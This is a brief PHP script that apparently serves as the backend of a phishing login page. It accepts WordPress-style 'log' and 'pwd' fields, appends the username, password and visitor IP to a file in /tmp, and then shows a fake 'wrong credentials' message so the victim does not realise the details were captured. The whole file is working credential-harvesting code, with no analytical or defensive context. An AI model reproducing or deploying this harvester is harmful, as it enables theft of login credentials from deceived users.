<?php
if(isset($_POST['log']) && isset($_POST['pwd'])) {
    $IP = $_SERVER['REMOTE_ADDR'];
    $data = $_POST['log'] . ' - ' . $_POST['pwd'] . ' - ' . $_SERVER['REMOTE_ADDR'] . "\n";
    $ret = file_put_contents('/tmp/mydata.txt', $data,  FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('Error');
    }
    else {
        echo "Sorry, wrong credentials";
    }
}
else {
   die('Please insert data !');
}
